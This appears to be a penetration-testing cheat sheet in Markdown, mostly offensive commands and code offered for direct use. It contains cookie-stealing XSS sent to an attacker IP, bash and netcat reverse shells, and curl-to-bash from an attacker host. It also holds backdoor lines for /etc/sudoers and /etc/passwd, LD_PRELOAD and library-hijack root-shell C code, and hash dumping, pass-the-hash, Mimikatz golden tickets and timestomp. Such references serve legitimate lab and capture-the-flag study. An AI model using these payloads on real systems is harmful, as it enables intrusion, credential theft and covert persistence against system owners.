# Table of Contents

## Networking

* [Host Discovery](#Host-Discovery)
* [Port Scanning](#Port-Scanning)
* [MAC Changer](#MAC-Changer)

## WEB

* [WEB Analysis](#WEB-Analysis)
* [WordPress](#WordPress)
* [AWS S3](#AWS-S3)
* [WEB Server](#WEB-Server)
* [XSS](#XSS)
* [SQL Injection](#SQL-Injection)
* [PHP Uploading Bypass](#PHP-Uploading-Bypass)
* [Port Tunnelling](#Port-Tunnelling)
* [WEB Fuzz](#WEB-Fuzz)
* [Jserv](#Jserv)

## Protocols

* [HTTP](#HTTP)
* [FTP](#FTP)
* [SMB](#SMB)
* [Pop3](#Pop3)
* [SSH](#SSH)
* [SCP](#SCP)
* [SQL](#SQL)
* [NFS](#NFS)
* [RDP](#RDP)

## Brute Forcing

* [Hash Analysis](#Hash-Analysis)
* [Brute Force](#Brute-Force)

## Linux

* [Shell Spawn](#Shell-Spawn)
* [Abusing Shell](#Abusing-Shell)
* [SUID](#SUID)
* [Capabilities](#Capabilities)
* [Sudo](#Sudo)
* [Sudoers](#Sudoers)
* [Netcat](#Netcat)
* [Curl](#Curl)
* [Payloads](#Payloads)
* [Linux Password](#Linux-Password)
* [Custom Wordlists](#Custom-Wordlists)
* [Crontab](#Crontab)
* [LXD Privilege Escalation](#LXD-Privilege-Escalation)
* [Reverse Engineering](#Reverse-Engineering)

## Windows
* [Windows Password](#Windows-Password)
* [Pass the Hash Attack](#Pass-the-Hash-Attack)
* [Kerberos](#Kerberos)
* [PowerShell](#PowerShell)
* [PowerView](#PowerView)
* [Looting](#Looting)

## Encoding / Cryptography

* [Base64](#Base64)
* [Base32](#Base32)
* [Base58](#Base58)
* [GPG](#GPG)
* [OpenSSL](#OpenSSL)
* [Steganography](#Steganography)
* [Files Signatures](#Files-Signatures)

## Scripts

* [Decimal to ASCII](#Decimal-to-ASCII)
* [Binary to Decimal](#Binary-to-Decimal)
* [Binary to ASCII](#Binary-to-ASCII)
* [Hex to ASCII](#Hex-to-ASCII)
* [ASCII to Char](#ASCII-to-Char)
* [Extract All File in Directory](#Extract-All-File-in-Directory)
* [Directory Files Iteration](#Directory-Files-Iteration)
* [Preload](#Preload)
* [Library Hijack](#Library-Hijack)
* [C Shell Spawn](#C-Shell-Spawn)
* [Dump Flags](#Dump-Flags)

## Frameworks

* [Metasploit](#Metasploit)


















# Host Discovery

```
netdiscover -r {NETWORK}/{MASK}
```

```
nmap -sV {NETWORK}/{MASK}
```

# Port Scanning

### Nmap
```
# Simple Scan
nmap {TARGET}

# Port Range Scan
nmap -p {MIN}-{MAX} {TARGET}

# All Ports Scan
nmap -p- {TARGET}

# Complete Scan
nmap -A -T4 -p- {TARGET}

# SYN Scan
nmap -sS -T4 -p- {TARGET}

# Script Scan Default
nmap --script=default {TARGET}

# Script Scan Vulnerabilities
nmap --script=vuln {TARGET}

# Search Nmap Scripts
ls -lah /usr/share/nmap/scripts
```

# MAC Changer

```
# Check current MAC Address
macchanger -s {INTERFACE}

# Change MAC Address to Random Value
ifconfig {INTERFACE} down
macchanger -r {INTERFACE}
ifconfig {INTERFACE} up

# Change MAC Address to Specific Value
ifconfig {INTERFACE} down
macchanger --mac 12:34:56:78:90:AB {INTERFACE}
ifconfig {INTERFACE} up

# Restore Original MAC Address
ifconfig {INTERFACE} down
macchanger -p {INTERFACE}
ifconfig {INTERFACE} up
```




















# WEB Analysis

### Nikto
```
nikto -h {TARGET}
```

### Dirb
```
dirb {TARGET}
```

### GoBuster
```
gobuster dir -t 50 -u {TARGET} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.js,/,.html

gobuster dir -t 50 -u {TARGET} -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x .php,.txt,.js,/,.html --wildcard
```

### Get Page Content
```
wget -r {TARGET}
```

# WordPress

### Analysis
```
# Simple Scan
wpscan --url {TARGET}

# Complete Scan
wpscan -e ap,at --url {TARGET}

# Looking for vulnerabilities
wpscan -e vp,vt --url {TARGET}

# User Enummeration
wpscan -e u --url {TARGET}
```

### Update Datase Password Hash
```
echo -n "password" | md5sum
5f4dcc3b5aa765d61d8327deb882cf99

mysql> UPDATE {TABLE} SET {FIELD}='5f4dcc3b5aa765d61d8327deb882cf99' WHERE ID={ID};
```

# AWS S3

### List Bucket Files
```
curl {BUCKET_NAME}.s3.amazonaws.com | xmllint --format -
```

### Download File
```
curl {BUCKET_NAME}.s3.amazonaws.com/{FILE}
```

# WEB Server

```
# Server up in current directory
python -m SimpleHTTPServer 8080
python -m http.server 8080

# GET
wget http://{TARGET}:{PORT}/{URI}
curl http://{TARGET}:{PORT}/{URI}
```

# XSS

### Validation
```
<script>alert('XSS Works')</script>
</p><script>console.log("XSS Works")</script><p>
<img src=x onerror=alert('XSS Works')>
```

### Acquiring Cookies
```
nc -lvnp 80
</p><script>window.location = 'http://{LOCAL_IP}/page?param=' + document.cookie </script><p>
```

# SQL Injection

### Version
```
# MySQL and MSSQL
@@version

# Oracle
SELECT banner FROM v$version)

# SQLite
sqlite_version()
```

### SQLite
```
# Table names
SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'

# List table fields
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='{TABLE}'

# Dump table fields
SELECT group_concat({FIELD_1} || "," || {FIELD_2} || "," || {FIELD_3} || ":") from {TABLE}
```

### SQLMap Analysis
```
# GET URL Parameter
sqlmap -u "http://example.com/search.php?q=" -p "q" --level=3 --risk=3 --random-agent --batch
```

```
# POST Paramenter where login.req is a text file with a login POST intercepted by Burp
sqlmap -r login.req -p "{POST_PARAMETER_1},{POST_PARAMETER_2}" --level=3 --risk=3 --random-agent --batch
```

```
# Navigation
sqlmap -r login.req -p {PARAMETER} --batch --current-db
sqlmap -r login.req -p {PARAMETER} --batch -D {DB} --schema
sqlmap -r login.req -p {PARAMETER} --batch -D {DB} --tables
sqlmap -r login.req -p {PARAMETER} --batch -D {DB} -T {TABLE} --columns
sqlmap -r login.req -p {PARAMETER} --batch -D {DB} -T {TABLE} -C {FIELD_1},{FIELD_2},{FIELD_3} --dump
```

# PHP Uploading Bypass

```
# .php
# .php3
# .php4
# .php5
# .phtml

mv reverse_shell.php reverse_shell.phtml
```

# Port Tunnelling

### Using SSH
```
ssh -N -L {PORT}:127.0.0.1:{PORT} {USER}@{TARGET}

# With Key
ssh -N -L {PORT}:127.0.0.1:{PORT} -i {KEY} {USER}@{TARGET}
```

# WEB Fuzz

### Parameter
```
# URL Parameter
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt http://{TARGET}/example/example.php?{PARAMETER}=FUZZ

# POST Data
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -d "{PARAMETER_1}=FUZZ&{PARAMETER_2}=FUZZ" -u http://{TARGET}/example.php
```

### Subdomain
```
wfuzz -c --hw 977 -u http://{TARGET} -H "Host: FUZZ.{TARGET}" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

# Jserv

```
# Get ajpShooter
wget https://raw.githubusercontent.com/00theway/Ghostcat-CNVD-2020-10487/master/ajpShooter.py

# Run ajpShooter
python3 ajpShooter.py http://{TARGET} {PORT} /WEB-INF/web.xml read
```



















# HTTP

### URL Scapping
```
# %20 = Space
# %2f = /
curl http://example.com/api/cmd/ls%20%2fhome
```

### Reverse Shell Example
```
# Listen
nc -lvnp {LOCAL_PORT}

# Request with: bash -i >& /dev/tcp/{LOCAL_IP}/{LOCAL_PORT} 0>&1
http://example.com/api/cmd/bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{LOCAL_IP}%2F{LOCAL_PORT}%200%3E%261
```

# FTP

```
# Access
nc {TARGET} 21

# Access
ftp {TARGET}

# Download file to current directory
ftp> ls
ftp> get {FILE}

# Download multiple files to current directory
ftp> mget {DIRECTORY}

# pwd
ftp> pwd
```

# SMB

```
# Enum4Linux
enum4linux -U -S {TARGET}

# Nmap Analysis
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse {TARGET}

# Disks list
smbmap -H {TARGET}

# Disks list with user auth
smbmap -u {USER} -p {PASSWORD} -H {TARGET}

# Connection
smbclient //{TARGET}/{DISK}

# Download file to current directory
smb: \> dir
smb: \> get {FILE}
```

# Pop3

```
# Connection
nc {TARGET} pop3

# Actions
> LIST
> RETR {ID}
```

# SSH

### Connection
```
# Password Auth
ssh {USER}@{IP}

# Key Auth in specific port
ssh {USER}@{IP} -i {KEY} -p {PORT}
```

### Key Generation
```
ssh-keygen -f {FILE}
```

# SCP

```
# Local to remote
scp {LOCAL_PATH} {USER}@{IP}:{REMOTE_PATH}

# Remote to Local
scp {USER}@{IP}:{REMOTE_PATH} {LOCAL_PATH}

# Key Auth in Specific Port
scp -i {KEY} -p {PORT} {USER}@{IP}:{REMOTE_PATH} {LOCAL_PATH}
```

# SQL

### Connection
```
mysql -u {USER} -h {TARGET} -p {PASSWORD}
```

### Actions
```
mysql> show databases;
mysql> use {DATABASE};
mysql> show tables;
mysql> describe {TABLE};
mysql> SELECT {FIELD_1},{FIELD_2} FROM {TABLE};
```

# NFS

### List Mount Points
```
# Nmap Analysis
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount {TARGET}

# Showmount
showmount -e {TARGET}

# Exports
cat /etc/exports
```

### Mount
```
sudo mount -t nfs -o nolock {TARGET}:{MOUNT_POINT} {LOCAL_PATH}
```

### Umount
```
sudo umount {LOCAL_PATH}
```

# RDP

```
xfreerdp /u:{USER} /p:{PASS} /v:{TARGET}
```

```
remmina
```

















# Hash Analysis

### Hashcat Hash Examples
[hashcat.net](https://hashcat.net/wiki/doku.php?id=example_hashes)

### Hash Identifier
```
hash-identifier {HASH}
```

### HashID
```
hashid -mj {HASH}
```

# Brute Force

### Hash
```
hashcat -m {MODE} {HASH_FILE} /usr/share/wordlists/rockyou.txt
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt {HASH_FILE} 
john --show {HASH_FILE}
```

### SSH
```
hydra -l {USER} -P /usr/share/wordlists/rockyou.txt ssh://{TARGET}
```

### FTP
```
hydra -l {USER} -P /usr/share/wordlists/rockyou.txt ftp://{TARGET}
```

### SSH Key
```
/usr/share/john/ssh2john.py {SSH_KEY_FILE} > {SSH_KEY_FILE}.john
john --wordlist=/usr/share/wordlists/rockyou.txt {SSH_KEY_FILE}.john
```

### ZIP
```
/usr/share/john/zip2john {ZIP_FILE} > {ZIP_FILE}.hash
john --wordlist='{WORDLIST_PATH}' {ZIP_FILE}.hash
john --show {ZIP_FILE}.hash
```

```
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' {ZIP_FILE}
```

### WordPress Login
```
hydra -l {USER} -P /usr/share/wordlists/rockyou.txt -f {TARGET} http-post-form "/weblog/wp-login.php:log=^USER^&pwd=^PASS^:login_error"
```

```
wpscan --url {TARGET} -U {USERS_LIST} -P /usr/share/wordlists/rockyou.txt
```

### Pop3
```
hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {TARGET} -f pop3
```

### MySQL
```
hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {TARGET} -f mysql
```

### PGP File
```
gpg2john {FILE} > {FILE}.john
john --wordlist=/usr/share/wordlists/rockyou.txt {FILE}.john
```



















# Shell Spawn

### Python
```
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### Bash
```
/suid/bash/binary -p
```

# SUID

```
# SUID
find / -type f -perm -u=s 2>/dev/null

# SUID + GUID
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

# Capabilities

```
getcap -r / 2>/dev/null
```

# Abusing Shell

### 1)
```
$ ls -lah /suid/binary
-rwsr-sr-x 1 root staff 6.8K May 14  2017 /suid/binary

$ strings /suid/binary
service apache2 start

$ gcc -o service /absolte/path/shell_spawn.c
$ PATH=.:$PATH /suid/binary
```

### 2)
```
$ /bin/bash --version
# Version need to be less than 4.2-048

$ ls -lah /suid/binary
-rwsr-sr-x 1 root staff 6.8K May 14  2017 /suid/binary

$ strings /suid/binary
/usr/sbin/service apache2 start

$ function /usr/sbin/service { /bin/bash -p; }
$ export -f /usr/sbin/service
$ /suid/binary
```

### 3)
```
$ /bin/bash --version
# Version need to be less than 4.4

$ ls -lah /suid/binary
-rwsr-sr-x 1 root staff 6.8K May 14  2017 /suid/binary

$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /suid/binary
$ /tmp/rootbash -p
```

### 4)
```
# Remote target with "no_root_squash,insecure" NFS flags enabled
# Remote target with /home/user mounted in host /tmp/mnt

# Run in target
$ cp /bin/bash /home/user/bash

# Run in host
$ sudo chown root:root /tmp/mnt/bash
$ sudo chmod 4777 /tmp/mnt/bash

# Run in target
$ /home/user/bash -p
```

# Sudo

### List Policy
```
sudo -l
```

### Run as User
```
sudo -u {USER} {COMMAND}
```

# Sudoers

```
# {USER} ALL=(ALL) NOPASSWD: ALL
echo "{USER} ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```

# Netcat

### Listen
```
nc -lcnp {PORT}
```

### Reverse Shell
```
bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
```

### Reverse Shell Using Backpipe
```
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc {IP} {PORT} 1>/tmp/backpipe
```

# Curl

### Run script content
```
curl http://{ATTACKER}/script.sh | bash
```

# Payloads

### Linux Reverse Python Raw
```
msfvenom -p cmd/unix/reverse_python LHOST={HOST_IP} LPORT={HOST_PORT} -f raw
```

# Linux Password

### /etc/shadow
```
mkpasswd -m sha-512 root
$6$bAzyC2dw/9TlXnh$EdycGclOk2oAWJ3ewD0jAebV4E0f15i79Ej4QC0hG/3ILILbSNckjNRQZn0ggnjPqXdgjX2kvzMDRJ5nzhZQG1
```

### /etc/passwd
```
# Generate Password Hash
openssl passwd password
wI1Q.j5MF3peQ

# Add 'newroot' User
echo "newroot:wI1Q.j5MF3peQ:0:0:root:/root:/bin/bash" >> /etc/passwd

# Generate Password Hash With Salt
openssl passwd -1 -salt root root
$1$root$9gr5KxwuEdiI80GtIzd.U0
```

# Custom Wordlists

### Cewl
```
cewl http://192.168.1.101/index.html > wordlist.txt
cewl {FILE} > wordlist.txt
cewl {URL} > wordlist.txt
```

# Crontab

### List Jobs
```
crontab -l
cat /etc/crontab
```

### Edit
```
crontab -e

# * * * * * <command to be executed>
# - - - - -
# | | | | |
# | | | | ----- Weekday (0 - 7) (Sunday is 0 or 7, Monday is 1...)
# | | | ------- Month (1 - 12)
# | | --------- Day (1 - 31)
# | ----------- Hour (0 - 23)
# ------------- Minute (0 - 59)
```

# LXD Privilege Escalation

### LXD Group
```
$ id
... groups=108(lxd) ...
```

### Attacker Machine
```
# Clone repository
git clone https://github.com/saghul/lxd-alpine-builder.git

# Build image package
sudo ./lxd-alpine-builder/build-alpine

# Rename image package
mv alpine-v3.13-x86_64-20210426_2250.tar.gz alpine.tar.gz

# Transfer file to target machine
# Ex1.: python -m SimpleHTTPServer 80
# Ex2.: scp alpine.tar.gz {USER}@{TARGET}:/tmp
```

### Target Machine
```
# Import image
lxc image import ./alpine.tar.gz --alias myimage

# List images
lxc image list

# Init
lxc init myimage ignite -c security.privileged=true

# Mapping / direcotry to image's /mnt/root
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

# Starting
lxc start ignite

# Spawn image's shell
lxc exec ignite /bin/sh

# Enter in mounted directory
cd /mnt/root/
```

# Reverse Engineering

### ltrace
```
ltrace {BINARY}
```



















# Windows Password

### Dump Hashes
```
# Secrets Dumps
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py {USER}:{PASSWORD}@{TARGET}
```

# Pass the Hash Attack

```
# PS Exec
python3 /usr/share/doc/python3-impacket/examples/psexec.py {USER}@{TARGET} -hashes {LMHASH:NTHASH}
```

# Kerberos

### Enum Users
```
./kerbrute_linux_386 userenum --dc {TAGET} -d {DNS} {USERS_FILE}
```

### Users Password Hash
```
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass -dc-ip {TARGET} {DNS}/{USER}
```

# PowerShell

### Spawn from CMD
```
# Default
C:\Windows\system32> powershell

# Bypassing Policies
C:\Windows\system32> powershell -eq bypass
```

### Hidden Files
```
Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue
```

### MD5 Hash
```
Get-FileHash -Algorithm MD5 file.txt
```

### List Volumes
```
vssadmin list volumes
```

### List Shadows
```
vssadmin list shadows
```

# PowerView

### CheatSheet
[HarmJ0y - PowerView](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### Init
```
. .\PowerView.ps1
```

### System Info
```
Get-NetComputer -fulldata
```

### Domain Users
```
Get-NetUser | select cn
```

### Shared Folders
```
Invoke-ShareFinder
```

# Looting

### SharpHound
```
# Init
. .\SharpHound.ps1

# Generate loot.zip
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```

# Bloodhound

### Init
```
sudo neo4j console

# Access WEB Page and change default password
# Default User: neo4j
# Default Pass: neo4j
firefox http://localhost:7474/
```

### Start
```
bloodhound
```



















# Base64

### Encoding
```
base64 {FILE}
base64 "{DATA}"
cat {FILE} | base64
echo "{DATA}" | base64
```

### Decoding
```
base64 -d {FILE}
base64 -d "{DATA}"
cat {FILE} | base64 -d
echo "{DATA}" | base64 -d
```

# Base32

### Encoding
```
base32 {FILE}
base32 "{DATA}"
cat {FILE} | base32
echo "{DATA}" | base32
```

### Decoding
```
base32 -d {FILE}
base32 -d "{DATA}"
cat {FILE} | base32 -d
echo "{DATA}" | base32 -d
```

# Base58

### Encoding
```
base58 {FILE}
base58 "{DATA}"
cat {FILE} | base58
echo "{DATA}" | base58
```

### Decoding
```
base58 -d {FILE}
base58 -d "{DATA}"
cat {FILE} | base58 -d
echo "{DATA}" | base58 -d
```

# GPG

### Decrypt
```
gpg -d {GPG_FILE}
```

# OpenSSL

### Decrypt RSA
```
openssl rsautl -decrypt -inkey {PRIV_KEY} -in {ENCRYPTED_FILE} -out {DECRYPTED_FILE}
```

# Steganography

### Exiftool
```
exiftool {FILE}
```

### Steghide
```
# Embed Data
steghide embed -cf {FILE} -ef {DATA_FILE}

# Extract Data
steghide extract -sf {FILE}
```

### BinWalk
```
# Analyse
binwalk {FILE}

# Extract
binwalk -e {FILE}
```

### StegSolve
```
wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
chmod +x stegsolve.jar
java -jar stegsolve.jar
```

# Files Signatures
 
List of Files Signatures: [garykessler.net](https://www.garykessler.net/library/file_sigs.html)

### Fixing/Changing File Signature
```
# File to Hex
xxd -p {FILE}.ext > {FILE}.hex

# Edit the first bytes to correct signature
vi {FILE}.hex

# Render file back with CyberChef
# https://gchq.github.io/CyberChef/
#
# Input:    {FILE}.hex
# Recipe 1: From Hex (Audo)
# Recipe 2: Render Image (Raw)
```



















# Binary to ASCII

```
$ cat bin.txt
01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010

$ cat bin2ascii.sh

#!/bin/bash
ARRAY=$(cat $1)
for bin in $ARRAY
do
	dec=$((2#${bin}))
	echo -ne \\x$(printf %02x $dec)
done
```

# Decimal to ASCII

```
$ cat dec.txt 
85 110 112 97 99 107 32 116 104 105 115 32 66 67 68

$ cat bin2ascii.sh 

#!/bin/bash
ARRAY=$(cat $1)
for dec in $ARRAY
do
	echo -ne \\x$(printf %02x $dec)
done
```

# Binary to Decimal

```
$ cat bin.txt
01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010

$ cat bin2dec.sh 

#!/bin/bash
ARRAY=$(cat $1)
for bin in $ARRAY
do
	echo -n "$((2#${bin})) "
done
```

# Hex to ASCII

```
echo {HEX_TEXT} | xxd -r -p
```

# ASCII to Char

```
$ cat ascii2char.c

#include <stdlib.h>
#include <stdio.h>

void main(void) {
	int ascii[] = {117, 115, 101, 32, 114, 111, 99, 107, 121, 111, 117, 46, 116, 120, 116};
	for (int i=0; i<sizeof(ascii)/sizeof(int); i++) printf("%c", ascii[i]);
	printf("\n");
}

gcc ascii2char.c -o ascii2char.o && ./ascii2char.o
```

# Extract All File in Directory

```
import os
import zipfile

filesList = os.listdir("./extract")

for file in filesList:
    filePath = './extract/' + str(file)
    with zipfile.ZipFile(filePath, 'r') as zipRef:
        zipRef.extractall('./extract_txt')
```

# Directory Files Iteration

```
#!/bin/bash

for file in ./path/*.txt ; do
	echo ${file}
done
```

# Preload

```
$ cat preload.c

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}

# Usage
$ sudo -l
(root) NOPASSWD: /usr/sbin/apache2

$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /absolute/path/preload.c
$ sudo LD_PRELOAD=/tmp/preload.so /usr/sbin/apache2
```

# Library Hijack

```
$ cat library.c

#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}

# Usage
$ sudo -l
(root) NOPASSWD: /usr/sbin/apache2

$ ldd /usr/sbin/apache2
libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f356c962000)

$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /absolute/path/library.c
$ sudo LD_LIBRARY_PATH=/tmp apache2
```

# C Shell Spawn

```
$ cat shell_spwan.c

int main() {
	setuid(0);
	system("/bin/bash -p");
}
```

# Dump Flags

```
find / -type f -iname '*.flag' -exec echo{} \; -exec cat {} \; 2>/dev/null
```
















# Metasploit

### Initializing
```
# Init DB
msfdb init

# Start Metasploit Console
msfconsole

# Check DB Status
db_status
```

### Core Commands
```
# Test Target Connection
connect {TARGET}

# Search
search {DATA}

# Module Info
info {MODULE_PATH}

# Select Module
use {MODULE_PATH}
```

### Sessions
```
# Background Current Session
CRTL + Z

# Show Sessions List
sessions

# Interact with Session
sessions -i {SESSION_ID}
```

### Internal NMAP
```
# Scan Example
db_nmap -sV {TARGET}

# Hosts Table
hosts

# Services Table
services

# Vulnerabilities Table
vulns
```

### Meterpreter
```
# System Info
sysinfo

# Get Current User
getuid

# Get Current Privileges
getprivs

# List Processes
ps

# Process Migration
migrate {PID}

# Run Exploit Suggester
run post/multi/recon/local_exploit_suggester

# Enable Windows RDP
run post/windows/manage/enable_rdp

# Shell Spwan
shell

# Retrive Stored Hashes
hashdump

# Modify Timestamps of System Files
timestomp
```

### Mimikatz (Kiwi)
```
# Load on Meterpreter
load kiwi

# Retrieve All Credentials
creds_all

# Persistence
golden_ticket_create
```
